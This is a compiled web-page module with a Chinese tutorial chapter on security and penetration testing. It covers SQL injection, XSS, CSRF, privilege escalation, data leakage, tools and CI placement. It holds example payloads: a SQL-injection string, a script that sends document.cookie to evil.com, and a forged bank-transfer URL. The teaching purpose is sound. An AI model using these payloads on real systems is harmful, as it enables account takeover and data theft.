import{b as a,O as s,g as e,j as n}from"./chunks/framework.DcaUmd3X.js";const u=JSON.parse('{"title":"安全测试与渗透测试","description":"","frontmatter":{},"headers":[],"relativePath":"testing/methodology/security-testing/index.md","filePath":"测试理论与实践/3.测试方法体系/10.安全测试与渗透测试.md","lastUpdated":1781688244000}'),o={name:"testing/methodology/security-testing/index.md"};function i(l,t,r,d,p,h){return s(),e("div",null,[...t[0]||(t[0]=[n(`<h1 id="安全测试与渗透测试" tabindex="-1">安全测试与渗透测试 <a class="header-anchor" href="#安全测试与渗透测试" aria-label="Permalink to &quot;安全测试与渗透测试&quot;">​</a></h1><blockquote><p>功能做得再好，一个 SQL 注入就能把整个数据库拖走。安全测试不是&quot;锦上添花&quot;，是&quot;地基里的钢筋&quot;。</p></blockquote><h2 id="安全测试测什么" tabindex="-1">安全测试测什么 <a class="header-anchor" href="#安全测试测什么" aria-label="Permalink to &quot;安全测试测什么&quot;">​</a></h2><p>安全测试的目的不是证明系统是安全的——没人能证明这个。安全测试的目的是：<strong>在攻击者之前，发现并修复可能被利用的漏洞。</strong></p><p>安全测试通常覆盖三个层面：</p><table tabindex="0"><thead><tr><th>层面</th><th>测什么</th><th>典型问题</th></tr></thead><tbody><tr><td><strong>网络安全</strong></td><td>网络传输过程中的安全性</td><td>数据是否明文传输？证书配置是否正确？</td></tr><tr><td><strong>应用安全</strong></td><td>应用本身的漏洞</td><td>SQL 注入、XSS、CSRF、权限越权</td></tr><tr><td><strong>数据安全</strong></td><td>数据存储和访问控制</td><td>敏感数据是否加密存储？谁能访问什么数据？</td></tr></tbody></table><p>对于大多数测试人员来说，<strong>应用安全</strong>是日常工作中接触最多的。这也是本章的重点。</p><h2 id="必须覆盖的五类基础漏洞" tabindex="-1">必须覆盖的五类基础漏洞 <a class="header-anchor" href="#必须覆盖的五类基础漏洞" aria-label="Permalink to &quot;必须覆盖的五类基础漏洞&quot;">​</a></h2><p>不管你测的是什么系统，以下五类问题至少要有基本的验证。</p><h3 id="_1-sql-注入" tabindex="-1">1. SQL 注入 <a class="header-anchor" href="#_1-sql-注入" aria-label="Permalink to &quot;1. SQL 注入&quot;">​</a></h3><p>程序把用户输入直接拼进 SQL 语句，攻击者就可以输入恶意的 SQL 片段来操控数据库。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># 一个典型的漏洞代码</span></span>
<span class="line"><span>sql = &quot;SELECT * FROM users WHERE name = &#39;&quot; + userInput + &quot;&#39;&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 用户输入：&#39; OR &#39;1&#39;=&#39;1&#39; --</span></span>
<span class="line"><span># 实际执行的 SQL：</span></span>
<span class="line"><span>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; --&#39;</span></span></code></pre></div><p>怎么测：在任何接受文本输入的地方——搜索框、登录框、表单字段——输入单引号 <code>&#39;</code> 和 SQL 关键字（<code>OR</code>、<code>AND</code>、<code>DROP</code>、<code>--</code>）。如果系统返回数据库错误或者异常行为，就是危险信号。</p><h3 id="_2-xss-跨站脚本攻击" tabindex="-1">2. XSS（跨站脚本攻击） <a class="header-anchor" href="#_2-xss-跨站脚本攻击" aria-label="Permalink to &quot;2. XSS（跨站脚本攻击）&quot;">​</a></h3><p>程序把用户输入直接渲染到页面上，没有做转义。攻击者可以在页面中注入 JavaScript 脚本。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># 用户输入（比如在评论区）：</span></span>
<span class="line"><span>&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39; + document.cookie)&lt;/script&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 如果页面直接渲染这段内容，所有访问这条评论的用户 cookie 都会被偷走</span></span></code></pre></div><p>怎么测：在任何会&quot;显示回用户输入内容&quot;的地方——评论区、昵称、搜索结果显示——输入 <code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>。如果弹窗了，说明存在反射型 XSS。</p><h3 id="_3-csrf-跨站请求伪造" tabindex="-1">3. CSRF（跨站请求伪造） <a class="header-anchor" href="#_3-csrf-跨站请求伪造" aria-label="Permalink to &quot;3. CSRF（跨站请求伪造）&quot;">​</a></h3><p>攻击者诱导用户在不知情的情况下，向已登录的网站发送请求。</p><p>典型场景：你登录了银行网站，同时打开了攻击者发的钓鱼邮件，邮件里的图片链接是 <code>bank.com/transfer?to=hacker&amp;amount=10000</code>。如果你的银行没有 CSRF 防护，转账请求就发出去了。</p><p>怎么测：检查关键操作（转账、改密码、下单）的请求中是否包含随机的 CSRF Token。抓包看看能不能复用同一个请求两次。</p><h3 id="_4-权限越权" tabindex="-1">4. 权限越权 <a class="header-anchor" href="#_4-权限越权" aria-label="Permalink to &quot;4. 权限越权&quot;">​</a></h3><p>用户 A 能访问或操作用户 B 的数据，或者普通用户能执行管理员操作。</p><p><strong>水平越权</strong>：用户 A 改一下 URL 里的 ID 就能看到用户 B 的订单：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>GET /orders/1001 → 看到自己的订单</span></span>
<span class="line"><span>GET /orders/1002 → 看到了别人的订单（越权！）</span></span></code></pre></div><p><strong>垂直越权</strong>：普通用户访问管理员接口：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>POST /admin/deleteUser?id=1001 → 普通用户不应该能调用这个接口</span></span></code></pre></div><p>怎么测：准备两个账号（A 和 B）。用 A 登录后，尝试用 B 的 ID 访问各种接口。再试试普通账号访问管理类接口。</p><h3 id="_5-敏感信息泄露" tabindex="-1">5. 敏感信息泄露 <a class="header-anchor" href="#_5-敏感信息泄露" aria-label="Permalink to &quot;5. 敏感信息泄露&quot;">​</a></h3><p>密码、手机号、身份证号等敏感数据在传输或存储时没有加密，或者在前端、日志、错误提示中意外暴露。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># 错误提示中暴露了数据库结构</span></span>
<span class="line"><span>{&quot;error&quot;: &quot;Column &#39;user_password&#39; not found in table &#39;users&#39;&quot;}</span></span></code></pre></div><p>怎么测：</p><ul><li>用抓包工具检查敏感接口是否使用 HTTPS</li><li>检查接口返回数据是否包含多余字段（比如用户列表里带了密码哈希）</li><li>检查错误页面和 API 错误响应是否暴露了内部实现细节</li><li>检查浏览器控制台是否有敏感信息输出</li></ul><h2 id="渗透测试-模拟真实攻击" tabindex="-1">渗透测试：模拟真实攻击 <a class="header-anchor" href="#渗透测试-模拟真实攻击" aria-label="Permalink to &quot;渗透测试：模拟真实攻击&quot;">​</a></h2><p>渗透测试和安全测试的目标是一样的——找漏洞，但<strong>视角不同</strong>。安全测试是从&quot;防御者&quot;的角度做系统性的检查，渗透测试是从&quot;攻击者&quot;的角度，模拟真实攻击手法尝试突破防线。</p><h3 id="渗透测试的典型流程" tabindex="-1">渗透测试的典型流程 <a class="header-anchor" href="#渗透测试的典型流程" aria-label="Permalink to &quot;渗透测试的典型流程&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>信息收集 ──→ 漏洞扫描 ──→ 漏洞利用 ──→ 权限提升 ──→ 报告与修复</span></span>
<span class="line"><span>(踩点)      (找弱点)    (尝试突破)   (扩大战果)    (给结论)</span></span></code></pre></div><ol><li><strong>信息收集</strong>：摸清目标的端口、服务、框架版本。攻击者用 nmap 扫描端口，测试人员用同样的方式看系统暴露了什么</li><li><strong>漏洞扫描</strong>：用自动化工具（如 OWASP ZAP、Burp Suite）扫描已知漏洞模式</li><li><strong>漏洞利用</strong>：对扫描到的高危漏洞，尝试实际利用，验证是否真的可行</li><li><strong>权限提升</strong>：从一个低权限的入口（比如一个 XSS）逐步扩大控制范围——拿到数据库、拿到服务器权限</li><li><strong>报告与修复</strong>：把成功利用的漏洞整理成报告，修复后重新验证</li></ol><h3 id="常用工具" tabindex="-1">常用工具 <a class="header-anchor" href="#常用工具" aria-label="Permalink to &quot;常用工具&quot;">​</a></h3><table tabindex="0"><thead><tr><th>工具</th><th>用途</th><th>特点</th></tr></thead><tbody><tr><td><strong>OWASP ZAP</strong></td><td>Web 应用漏洞扫描</td><td>开源、免费，适合日常安全测试</td></tr><tr><td><strong>Burp Suite</strong></td><td>Web 应用安全测试</td><td>功能更强，Community 版免费，Pro 版收费</td></tr><tr><td><strong>sqlmap</strong></td><td>SQL 注入检测和利用</td><td>自动化程度高，能直接检测和利用注入点</td></tr><tr><td><strong>nmap</strong></td><td>端口扫描</td><td>发现目标开放了哪些端口和服务</td></tr></tbody></table><blockquote><p>这些工具在授权范围内的安全测试中是合法且有价值的防护武器。但同样的工具落入攻击者手里就是武器——这也是为什么我们需要在攻击者之前使用它们。</p></blockquote><h3 id="渗透测试不只是工具扫描" tabindex="-1">渗透测试不只是工具扫描 <a class="header-anchor" href="#渗透测试不只是工具扫描" aria-label="Permalink to &quot;渗透测试不只是工具扫描&quot;">​</a></h3><p>工具能发现大部分已知模式的安全漏洞——SQL 注入、XSS、CSRF——这些不需要渗透测试人员&quot;手挖&quot;。但<strong>业务逻辑漏洞</strong>是工具扫不出来的。</p><p>比如：</p><ul><li>优惠券规则设计有漏洞，叠加使用可以&quot;零元购&quot;</li><li>提现接口没有校验&quot;待结算金额&quot;和&quot;已提现金额&quot;，可以重复提现</li><li>邀请奖励机制的金额计算溢出——邀请人数超过某个数字后奖励变成了负数</li></ul><p>这类漏洞需要深入理解业务流程，用探索式测试的思维去发现。工具跑完还得人上。</p><h2 id="安全测试在测试象限中的位置" tabindex="-1">安全测试在测试象限中的位置 <a class="header-anchor" href="#安全测试在测试象限中的位置" aria-label="Permalink to &quot;安全测试在测试象限中的位置&quot;">​</a></h2><p>回到<a href="/testing/engineering/agile-testing-1.html">敏捷测试（上）</a>会详细讲的敏捷测试四象限，安全测试属于 <strong>Q4——面向技术、评价产品</strong>。</p><p>安全测试的特点是：</p><ul><li><strong>偏技术</strong>：需要对攻击向量、加密协议、认证机制有基本了解</li><li><strong>需要工具辅助</strong>：手动测试只能覆盖一小部分，自动化扫描是主力</li><li><strong>尽早做，不要留到最后</strong>：安全漏洞修复成本随发现时间指数增长——需求阶段发现改一行需求文档，上线后发现要回滚整个版本</li></ul><p><a href="/testing/execution/regression-release.html">回归测试与上线标准</a>的上线七条标准中，安全性是不可跳过的一条。一个功能再完善、性能再好，只要有一条高危安全漏洞，就不能上线。</p><h3 id="安全测试在部署管道中的位置" tabindex="-1">安全测试在部署管道中的位置 <a class="header-anchor" href="#安全测试在部署管道中的位置" aria-label="Permalink to &quot;安全测试在部署管道中的位置&quot;">​</a></h3><p>安全测试不是&quot;发布前做一次渗透测试&quot;就完事了。业界的最佳实践是<strong>分层嵌入部署管道</strong>，和<a href="/testing/engineering/continuous-delivery-1.html">持续交付（上）</a>要讲的持续交付管道一一对应：</p><table tabindex="0"><thead><tr><th>管道阶段</th><th>安全测试类型</th><th>工具</th><th>做什么</th></tr></thead><tbody><tr><td><strong>提交阶段</strong></td><td>SAST（静态应用安全测试）</td><td>SonarQube、CodeQL</td><td>扫描源码中的安全漏洞模式——SQL 注入风险、硬编码密钥、不安全的加密算法</td></tr><tr><td><strong>验收阶段</strong></td><td>DAST（动态应用安全测试）</td><td>OWASP ZAP、Burp Suite</td><td>在运行中的应用上自动扫描——XSS、CSRF、路径遍历等运行时漏洞</td></tr><tr><td><strong>发布前</strong></td><td>人工渗透测试</td><td>人 + 工具</td><td>工具扫完发现的高危点 + 业务逻辑漏洞的深度挖掘</td></tr></tbody></table><p>分层的逻辑和回归测试一样——越靠近提交越自动化、越快；越靠近发布越深度、越依赖人。SAST 几秒跑完、DAST 几分钟到几十分钟、人工渗透几小时到几天。把 SAST 和 DAST 卡在提交和验收阶段，高危漏洞就不会流到发布前才发现。</p><h2 id="本章小结" tabindex="-1">本章小结 <a class="header-anchor" href="#本章小结" aria-label="Permalink to &quot;本章小结&quot;">​</a></h2><ol><li>安全测试三个层面：网络安全、应用安全、数据安全——日常测试工作以应用安全为主</li><li>五类基础漏洞必须会测：SQL 注入、XSS、CSRF、权限越权（水平+垂直）、敏感信息泄露</li><li>渗透测试用攻击者视角模拟真实攻击——工具扫描覆盖已知漏洞，人工挖掘覆盖业务逻辑漏洞</li><li>常用工具：OWASP ZAP（开源扫描）、Burp Suite（专业测试）、sqlmap（注入检测）、nmap（端口扫描）</li><li>安全测试属于测试象限 Q4——工具驱动、面向技术。安全不是可选项，越早测修复成本越低</li><li>安全测试分层嵌入部署管道：提交阶段 SAST（源码扫描）、验收阶段 DAST（运行扫描）、发布前人工渗透——越靠近提交越快，越靠近发布越深</li></ol>`,57)])])}const g=a(o,[["render",i]]);export{u as __pageData,g as default};
